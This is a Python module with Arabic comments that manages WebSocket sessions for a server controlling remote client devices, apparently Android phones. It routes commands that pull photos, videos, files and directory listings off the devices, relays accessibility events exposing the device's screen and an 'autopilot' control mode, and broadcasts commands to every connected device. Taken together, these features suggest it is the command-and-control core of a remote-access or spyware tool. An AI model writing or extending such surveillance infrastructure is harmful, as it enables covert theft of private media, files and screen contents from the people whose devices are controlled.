#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
session_manager.py
============================================================
مدير الجلسات — العقل المركزي للسيرفر.

المسؤوليات:
  1. إنشاء جلسة لكل عميل جديد (عند الاتصال).
  2. إزالة الجلسة عند الانقطاع.
  3. توجيه الرسائل الواردة حسب نوعها (RESULT, DATA, FILE_CHUNK, EVENT).
  4. توفير API موحّد للطرفية (select, list, send_command).
  5. إغلاق نظيف لكل الجلسات عند إيقاف السيرفر.
  6. كشف الجلسات الميتة (stale) وتنظيفها.

يعتمد على:
  - ClientSession (يمثل جلسة واحدة)
  - commands/* (photos, videos, files, accessibility)
  - utils.logger

الاستخدام:
  sm = SessionManager()
  session = await sm.create_session(ws, "192.168.1.42:54321")
  session = sm.get_session("a3f8b2c1")
  sessions = sm.get_all_sessions()
  await sm.close_all()
============================================================
"""

import asyncio
import logging
import time
from typing import Any, Dict, List, Optional

from core.client_session import ClientSession
from utils.logger import get_logger, truncate

logger = get_logger("session_manager")


# ============================================================
# 1. الإعدادات
# ============================================================
# فترة السماح قبل اعتبار الجلسة "ميتة" (ثواني)
STALE_TIMEOUT = 120

# فترة التنظيف الدوري (ثواني)
CLEANUP_INTERVAL = 60


# ============================================================
# 2. SessionManager
# ============================================================
class SessionManager:
    """
    يدير كل الجلسات النشطة.
    """

    def __init__(self):
        # الجلسات: {client_id: ClientSession}
        self._sessions: Dict[str, ClientSession] = {}

        # قفل للعمليات الذرية
        self._lock = asyncio.Lock()

        # مرجع المعالجات (يُحقن لاحقاً لتجنب الاستيراد الدائري)
        self._photos_handler = None
        self._videos_handler = None
        self._files_handler = None
        self._accessibility_handler = None

        # مهمة التنظيف
        self._cleanup_task: Optional[asyncio.Task] = None

        logger.info("SessionManager initialized")

    # ========================================================
    # 2.1 إدارة المعالجات (Dependency Injection)
    # ========================================================
    def register_handlers(
        self,
        photos=None,
        videos=None,
        files=None,
        accessibility=None,
    ) -> None:
        """
        ربط المعالجات (commands/*) بالمدير.
        يُستدعى من main.py لتجنب الاستيراد الدائري.
        """
        if photos is not None:
            self._photos_handler = photos
        if videos is not None:
            self._videos_handler = videos
        if files is not None:
            self._files_handler = files
        if accessibility is not None:
            self._accessibility_handler = accessibility

        logger.info("Handlers registered")

    # ========================================================
    # 2.2 دورة حياة الجلسات
    # ========================================================
    async def create_session(self, websocket, client_addr: str) -> ClientSession:
        """
        إنشاء جلسة جديدة لعميل متصل حديثاً.
        """
        async with self._lock:
            session = ClientSession(websocket, client_addr)
            self._sessions[session.client_id] = session

        logger.info(
            f"Session created: {session.client_id} @ {client_addr} "
            f"(total: {len(self._sessions)})"
        )
        return session

    async def remove_session(self, client_id: str) -> bool:
        """
        إزالة جلسة (عند الانقطاع).
        """
        async with self._lock:
            session = self._sessions.pop(client_id, None)

        if session is None:
            return False

        # تنظيف المعالجات المرتبطة بالعميل
        self._cleanup_client_handlers(client_id)

        logger.info(
            f"Session removed: {client_id} "
            f"(remaining: {len(self._sessions)})"
        )
        return True

    async def close_all(self) -> None:
        """
        إغلاق كل الجلسات (عند إيقاف السيرفر).
        """
        async with self._lock:
            sessions = list(self._sessions.values())
            self._sessions.clear()

        logger.info(f"Closing {len(sessions)} session(s)...")

        for session in sessions:
            try:
                await session.close(1001, "Server shutting down")
            except Exception as e:
                logger.warning(f"Error closing {session.client_id}: {e}")

            # تنظيف
            self._cleanup_client_handlers(session.client_id)

        logger.info("All sessions closed")

    # ========================================================
    # 2.3 الوصول للجلسات
    # ========================================================
    def get_session(self, client_id: str) -> Optional[ClientSession]:
        """إرجاع جلسة بمعرفها."""
        return self._sessions.get(client_id)

    def get_all_sessions(self) -> List[ClientSession]:
        """إرجاع كل الجلسات."""
        return list(self._sessions.values())

    def get_alive_sessions(self) -> List[ClientSession]:
        """إرجاع الجلسات المتصلة فقط."""
        return [s for s in self._sessions.values() if s.is_alive]

    def count(self) -> int:
        """عدد الجلسات."""
        return len(self._sessions)

    def count_alive(self) -> int:
        """عدد الجلسات المتصلة."""
        return len(self.get_alive_sessions())

    def exists(self, client_id: str) -> bool:
        """هل توجد جلسة؟"""
        return client_id in self._sessions

    # ========================================================
    # 2.4 إرسال الأوامر
    # ========================================================
    async def send_command(
        self,
        client_id: str,
        command: Dict[str, Any],
    ) -> bool:
        """
        إرسال أمر لعميل محدد.
        """
        session = self.get_session(client_id)
        if session is None:
            logger.warning(f"send_command: client not found: {client_id}")
            return False

        return await session.send_command(command)

    async def broadcast(
        self,
        command: Dict[str, Any],
        exclude: Optional[List[str]] = None,
    ) -> int:
        """
        بث أمر لكل الجلسات النشطة.
        """
        exclude = exclude or []
        count = 0

        for session in self.get_alive_sessions():
            if session.client_id in exclude:
                continue
            if await session.send_command(command):
                count += 1

        logger.info(f"Broadcast to {count} client(s)")
        return count

    # ========================================================
    # 2.5 توجيه الرسائل الواردة (Router)
    # ========================================================
    async def route_message(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> None:
        """
        توجيه رسالة واردة إلى المعالج المناسب.
        يُستدعى من websocket_server عند وصول رسالة.
        """
        session = self.get_session(client_id)
        if session is None:
            logger.debug(f"route_message: no session for {client_id}")
            return

        msg_type = message.get("type", "")
        cmd = message.get("cmd", "")

        try:
            # ---------- 1. RESULT ----------
            if msg_type == "RESULT":
                # يُوجَّه إلى accessibility أو أحد المعالجات
                await self._route_result(client_id, message)

            # ---------- 2. DATA ----------
            elif msg_type == "DATA":
                await self._route_data(client_id, message)

            # ---------- 3. FILE_CHUNK ----------
            elif msg_type == "FILE_CHUNK":
                await self._route_file_chunk(client_id, message, cmd)

            # ---------- 4. EVENT ----------
            elif msg_type == "EVENT":
                await self._route_event(client_id, message)

            # ---------- 5. HELLO ----------
            elif msg_type == "HELLO":
                # HELLO يُعالج في ClientSession.on_message
                pass

            else:
                logger.debug(
                    f"Unrouted message: type={msg_type} cmd={cmd} "
                    f"from {client_id}"
                )

        except Exception as e:
            logger.exception(f"route_message error for {client_id}: {e}")

    async def _route_result(self, client_id: str, message: Dict[str, Any]) -> None:
        """توجيه RESULT."""
        # جرّب accessibility أولاً (لأن لها pending requests)
        if self._accessibility_handler is not None:
            handled = await self._accessibility_handler.on_result(client_id, message)
            if handled:
                return

        # RESULT عام: نضعه في طابور الجلسة للعرض في CLI
        session = self.get_session(client_id)
        if session is not None:
            await session.on_message(message)

    async def _route_data(self, client_id: str, message: Dict[str, Any]) -> None:
        """توجيه DATA."""
        cmd = message.get("cmd", "")

        # LIST_DIR → files handler
        if cmd == "LIST_DIR" and self._files_handler is not None:
            handled = await self._files_handler.on_list_result(client_id, message)
            if handled:
                return

        # DATA عام → طابور الجلسة
        session = self.get_session(client_id)
        if session is not None:
            await session.on_message(message)

    async def _route_file_chunk(
        self,
        client_id: str,
        message: Dict[str, Any],
        cmd: str,
    ) -> None:
        """توجيه FILE_CHUNK حسب الأمر."""
        try:
            saved_path = None

            if cmd == "GET_PHOTOS" and self._photos_handler is not None:
                saved_path = await self._photos_handler.on_file_chunk(client_id, message)

            elif cmd == "GET_VIDEOS" and self._videos_handler is not None:
                saved_path = await self._videos_handler.on_file_chunk(client_id, message)

            elif cmd == "GET_FILE" and self._files_handler is not None:
                saved_path = await self._files_handler.on_file_chunk(client_id, message)

            else:
                logger.debug(
                    f"Unhandled FILE_CHUNK: cmd={cmd} from {client_id}"
                )

            # إشعار الجلسة عند اكتمال ملف (للعرض في CLI)
            if saved_path is not None:
                session = self.get_session(client_id)
                if session is not None:
                    await session.on_message({
                        "type": "FILE_SAVED",
                        "path": str(saved_path),
                        "cmd": cmd,
                    })

        except Exception as e:
            logger.exception(f"FILE_CHUNK routing error: {e}")

    async def _route_event(self, client_id: str, message: Dict[str, Any]) -> None:
        """توجيه EVENT."""
        event = message.get("event", "")

        # أحداث Accessibility
        if event in ("UI_TREE", "CURRENT_PACKAGE", "AUTOPILOT_READY"):
            if self._accessibility_handler is not None:
                handled = await self._accessibility_handler.on_event(client_id, message)
                if handled:
                    return

        # أحداث التقدم → طابور الجلسة (للعرض في CLI)
        if event in ("FILE_PROGRESS", "PHOTOS_PROGRESS",
                     "VIDEOS_PROGRESS", "FILE_SAVED"):
            session = self.get_session(client_id)
            if session is not None:
                await session.on_message(message)
                return

        logger.debug(f"Unhandled event: {event} from {client_id}")

    # ========================================================
    # 2.6 تنظيف المعالجات المرتبطة بعميل
    # ========================================================
    def _cleanup_client_handlers(self, client_id: str) -> None:
        """
        تنظيف أي حالة معلّقة في المعالجات لعميل معين.
        """
        try:
            if self._photos_handler is not None:
                self._photos_handler.clear_client(client_id)
        except Exception:
            pass

        try:
            if self._videos_handler is not None:
                self._videos_handler.clear_client(client_id)
        except Exception:
            pass

        try:
            if self._files_handler is not None:
                self._files_handler.clear_client(client_id)
        except Exception:
            pass

        try:
            if self._accessibility_handler is not None:
                self._accessibility_handler.cancel_pending(client_id)
        except Exception:
            pass

    # ========================================================
    # 2.7 التنظيف الدوري (Stale Sessions)
    # ========================================================
    async def start_cleanup(self) -> None:
        """بدء مهمة التنظيف الدوري."""
        if self._cleanup_task is not None:
            return
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info("Cleanup task started")

    async def stop_cleanup(self) -> None:
        """إيقاف مهمة التنظيف."""
        if self._cleanup_task is None:
            return
        self._cleanup_task.cancel()
        try:
            await self._cleanup_task
        except asyncio.CancelledError:
            pass
        self._cleanup_task = None
        logger.info("Cleanup task stopped")

    async def _cleanup_loop(self) -> None:
        """حلقة التنظيف الدوري."""
        while True:
            try:
                await asyncio.sleep(CLEANUP_INTERVAL)
                await self.cleanup_stale()
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.exception(f"Cleanup error: {e}")

    async def cleanup_stale(self) -> int:
        """
        إزالة الجلسات الميتة (لا نشاط لفترة طويلة).
        """
        now = time.time()
        stale_ids = []

        for client_id, session in list(self._sessions.items()):
            # هل هي ميتة؟
            if not session.is_alive:
                stale_ids.append(client_id)
                continue

            # هل خاملة لفترة طويلة؟
            if (now - session.last_activity) > STALE_TIMEOUT:
                stale_ids.append(client_id)

        for client_id in stale_ids:
            logger.warning(f"Removing stale session: {client_id}")
            await self.remove_session(client_id)

        if stale_ids:
            logger.info(f"Cleaned {len(stale_ids)} stale session(s)")

        return len(stale_ids)

    # ========================================================
    # 2.8 إحصائيات
    # ========================================================
    def get_stats(self) -> Dict[str, Any]:
        """إحصائيات عامة."""
        sessions = self.get_all_sessions()

        total_messages_received = sum(s.messages_received for s in sessions)
        total_messages_sent = sum(s.messages_sent for s in sessions)

        return {
            "total_sessions": len(sessions),
            "alive_sessions": self.count_alive(),
            "total_messages_received": total_messages_received,
            "total_messages_sent": total_messages_sent,
            "stale_timeout": STALE_TIMEOUT,
        }

    def list_sessions_summary(self) -> List[Dict[str, Any]]:
        """ملخص كل الجلسات."""
        return [s.to_dict() for s in self.get_all_sessions()]

    # ========================================================
    # 2.9 أدوات مساعدة
    # ========================================================
    def find_by_device(self, model: str) -> List[ClientSession]:
        """البحث عن جلسات بجهاز معين."""
        model_lower = model.lower()
        return [
            s for s in self.get_all_sessions()
            if model_lower in str(s.device_info.get("model", "")).lower()
        ]

    def find_by_package_active(self) -> List[ClientSession]:
        """الجلسات التي فعّلت Accessibility."""
        return [
            s for s in self.get_all_sessions()
            if s.device_info.get("autopilot", False)
        ]

    def __len__(self) -> int:
        return len(self._sessions)

    def __repr__(self) -> str:
        return f"<SessionManager sessions={len(self._sessions)}>"